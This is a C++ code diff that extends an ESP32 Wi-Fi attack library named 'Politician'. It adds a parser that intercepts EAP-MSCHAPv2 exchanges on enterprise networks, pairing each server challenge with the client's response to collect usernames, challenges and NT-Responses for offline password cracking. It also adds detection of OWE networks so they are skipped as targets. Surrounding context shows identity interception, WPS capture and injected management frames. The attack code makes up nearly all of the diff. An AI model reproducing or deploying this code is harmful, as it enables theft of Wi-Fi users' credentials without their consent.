@@ -66,6 +66,9 @@ Politician::Politician()
     memset(_fishSsid,  0, sizeof(_fishSsid));
     memset(_ownStaMac, 0, sizeof(_ownStaMac));
     memset(_ignoreList, 0, sizeof(_ignoreList));
+#ifndef POLITICIAN_NO_MSCHAPV2
+    memset(_msChapSessions, 0, sizeof(_msChapSessions));
+#endif
 }
 
 // ─── Logging ─────────────────────────────────────────────────────────────────
@@ -1031,6 +1034,7 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
                     if (memcmp(_apCache[i].bssid, ap.bssid, 6) != 0) continue;
 
                     if (_cfg.skip_immune_networks && _apCache[i].flags.is_wpa3_only) break;
+                    if (_apCache[i].enc == ENC_OWE) break; // OWE uses DH key exchange — no PMKID to capture
                     if (_cfg.min_beacon_count > 0 && _apCache[i].beacon_count < _cfg.min_beacon_count) break;
                     if (_cfg.require_active_clients && !_apCache[i].flags.has_active_clients) break;
 
@@ -1049,6 +1053,7 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
                 for (int i = 0; i < MAX_AP_CACHE; i++) {
                     if (_apCache[i].flags.active && memcmp(_apCache[i].bssid, ap.bssid, 6) == 0) {
                         if (_cfg.skip_immune_networks && _apCache[i].flags.is_wpa3_only) return;
+                        if (_apCache[i].enc == ENC_OWE) return; // OWE — no capturable handshake
                         if (_cfg.min_beacon_count > 0 && _apCache[i].beacon_count < _cfg.min_beacon_count) return;
                         if (_cfg.require_active_clients && !_apCache[i].flags.has_active_clients) return;
                         break;
@@ -1233,13 +1238,17 @@ void Politician::_handleData(const ieee80211_hdr_t *hdr, const uint8_t *payload,
     uint16_t eapol_len = len - EAPOL_LLC_SIZE;
 
     if (eapol_len >= 4) {
-        if (eapol[1] == 0x00 && (_identityCb != nullptr || _wpsCb != nullptr)) {
-            // Decoupled 802.1X Enterprise Identity Interception
+        if (eapol[1] == 0x00 && (_identityCb != nullptr || _wpsCb != nullptr
+#ifndef POLITICIAN_NO_MSCHAPV2
+            || _msChapCb != nullptr
+#endif
+        )) {
             if (_identityCb != nullptr) _parseEapIdentity(bssid, sta, eapol, eapol_len, rssi);
-            // WPS M1 capture (EAP-WSC Expanded type)
-            if (_wpsCb != nullptr) _parseWpsFrame(bssid, sta, eapol, eapol_len, rssi);
+            if (_wpsCb != nullptr)      _parseWpsFrame(bssid, sta, eapol, eapol_len, rssi);
+#ifndef POLITICIAN_NO_MSCHAPV2
+            if (_msChapCb != nullptr)   _parseEapMsChap(bssid, sta, eapol, eapol_len, rssi);
+#endif
         } else if (eapol[1] == 0x03) {
-            // Standard WPA2/WPA3 EAPOL-Key Handshake Layer
             _parseEapol(bssid, sta, eapol, eapol_len, rssi);
         }
     }
@@ -1634,6 +1643,96 @@ void Politician::_sendBtmRequest(const uint8_t *bssid, const uint8_t *sta) {
     esp_wifi_80211_tx(WIFI_IF_AP, frame, p, false);
 }
 
+#ifndef POLITICIAN_NO_MSCHAPV2
+void Politician::_parseEapMsChap(const uint8_t *bssid, const uint8_t *sta,
+                                   const uint8_t *eapol, uint16_t len, int8_t rssi) {
+    // EAP frame layout:
+    //  eapol[0-3]: EAPOL header (version, type=0x00, body-length 2B)
+    //  eapol[4]:   EAP Code (1=Request from AP, 2=Response from client)
+    //  eapol[5]:   EAP Identifier
+    //  eapol[6-7]: EAP Length (big-endian, includes code+id+len bytes)
+    //  eapol[8]:   EAP Type = 0x1A (MSCHAPv2)
+    //  eapol[9]:   MS-CHAPv2 OpCode (1=Challenge, 2=Response)
+    //  eapol[10]:  MS-CHAPv2 MS-Identifier
+    //  eapol[11-12]: MS-Length (big-endian)
+    //  Challenge (OpCode=1): eapol[13]=ValueSize(16), eapol[14-29]=Challenge, eapol[30+]=APName
+    //  Response  (OpCode=2): eapol[13]=ValueSize(49), eapol[14-29]=PeerChallenge, eapol[30-37]=Reserved,
+    //                         eapol[38-61]=NT-Response, eapol[62]=Flags, eapol[63+]=Username
+
+    if (len < 13) return;
+    if (eapol[8] != 0x1A) return;  // Must be EAP-MSCHAPv2
+
+    uint8_t eap_code  = eapol[4];
+    uint8_t eap_id    = eapol[5];
+    uint8_t mschap_op = eapol[9];
+    uint8_t ms_id     = eapol[10];
+
+    if (mschap_op == 0x01 && eap_code == 0x01) {
+        // AP → Client: MSCHAPv2 Challenge — store the server challenge
+        if (len < 30) return;
+        if (eapol[13] != 16) return;  // Value-Size must be 16
+
+        // Find or create a session slot
+        int slot = -1;
+        for (int i = 0; i < MAX_MSCHAP_SESSIONS; i++) {
+            if (!_msChapSessions[i].active) { slot = i; break; }
+            // Reuse oldest matching BSSID+ms_id
+            if (memcmp(_msChapSessions[i].bssid, bssid, 6) == 0 && _msChapSessions[i].ms_id == ms_id) {
+                slot = i; break;
+            }
+        }
+        if (slot == -1) slot = 0;  // Evict slot 0 if full
+
+        _msChapSessions[slot].active = true;
+        memcpy(_msChapSessions[slot].bssid, bssid, 6);
+        _msChapSessions[slot].ms_id = ms_id;
+        memcpy(_msChapSessions[slot].challenge, eapol + 14, 16);
+        _log("[MSCHAPv2] Challenge from %02X:%02X:%02X:%02X:%02X:%02X ms_id=%d\n",
+             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ms_id);
+        return;
+    }
+
+    if (mschap_op == 0x02 && eap_code == 0x02) {
+        // Client → AP: MSCHAPv2 Response — find the matching challenge
+        if (len < 64) return;
+        if (eapol[13] != 49) return;  // Value-Size must be 49
+
+        int slot = -1;
+        for (int i = 0; i < MAX_MSCHAP_SESSIONS; i++) {
+            if (_msChapSessions[i].active &&
+                memcmp(_msChapSessions[i].bssid, bssid, 6) == 0 &&
+                _msChapSessions[i].ms_id == ms_id) {
+                slot = i; break;
+            }
+        }
+        if (slot == -1) return;  // No matching challenge
+
+        MsChapRecord rec; memset(&rec, 0, sizeof(rec));
+        memcpy(rec.bssid, bssid, 6);
+        memcpy(rec.sta,   sta,   6);
+        rec.channel = _rxChannel;
+        rec.rssi    = rssi;
+        memcpy(rec.server_challenge, _msChapSessions[slot].challenge, 16);
+        memcpy(rec.peer_challenge,   eapol + 14, 16);
+        memcpy(rec.nt_response,      eapol + 38, 24);
+
+        // Username is everything after the Flags byte (eapol[62])
+        uint16_t uname_off = 63;
+        uint16_t uname_len = (len > uname_off) ? (len - uname_off) : 0;
+        if (uname_len > 64) uname_len = 64;
+        memcpy(rec.username, eapol + uname_off, uname_len);
+        rec.username[uname_len] = '\0';
+
+        _msChapSessions[slot].active = false;
+
+        _log("[MSCHAPv2] Response user='%s' from %02X:%02X:%02X:%02X:%02X:%02X\n",
+             rec.username, sta[0], sta[1], sta[2], sta[3], sta[4], sta[5]);
+
+        if (_msChapCb) _msChapCb(rec);
+    }
+}
+#endif
+
 void Politician::_parseSsid(const uint8_t *ie, uint16_t ie_len, char *out, uint8_t &out_len) {
     out[0]  = '\0'; out_len = 0; uint16_t pos = 0;
     while (pos + 2 <= ie_len) {
@@ -1647,7 +1746,7 @@ void Politician::_parseSsid(const uint8_t *ie, uint16_t ie_len, char *out, uint8
 }
 
 uint8_t Politician::_classifyEnc(const uint8_t *ie, uint16_t ie_len) {
-    bool has_rsn = false, has_wpa = false, is_enterprise = false; 
+    bool has_rsn = false, has_wpa = false, is_enterprise = false, is_owe = false;
     uint16_t pos = 0;
     while (pos + 2 <= ie_len) {
         uint8_t tag = ie[pos]; uint8_t len = ie[pos + 1];
@@ -1667,9 +1766,10 @@ uint8_t Politician::_classifyEnc(const uint8_t *ie, uint16_t ie_len) {
                     
                     for (int i=0; i < akm_count; i++) {
                         if (list_offset + 4 > pos + 2 + len) break;
-                        // OUI: 00-0F-AC, Suite Type: 1 (802.1X)
-                        if (ie[list_offset] == 0x00 && ie[list_offset+1] == 0x0F && ie[list_offset+2] == 0xAC && ie[list_offset+3] == 0x01) {
-                            is_enterprise = true;
+                        if (ie[list_offset] == 0x00 && ie[list_offset+1] == 0x0F && ie[list_offset+2] == 0xAC) {
+                            uint8_t suite = ie[list_offset + 3];
+                            if (suite == 0x01) is_enterprise = true; // 802.1X (EAP)
+                            if (suite == 0x12) is_owe = true;        // OWE (AKM 18) — no PSK/PMKID
                         }
                         list_offset += 4;
                     }
@@ -1680,8 +1780,9 @@ uint8_t Politician::_classifyEnc(const uint8_t *ie, uint16_t ie_len) {
         pos += 2 + len;
     }
     
-    if (is_enterprise) return 4;
-    return has_rsn ? 3 : (has_wpa ? 2 : 0);
+    if (is_enterprise) return ENC_ENT;
+    if (is_owe)        return ENC_OWE;
+    return has_rsn ? ENC_WPA2 : (has_wpa ? ENC_WPA : ENC_OPEN);
 }
 
 bool Politician::_detectWpa3Only(const uint8_t *ie, uint16_t ie_len) {
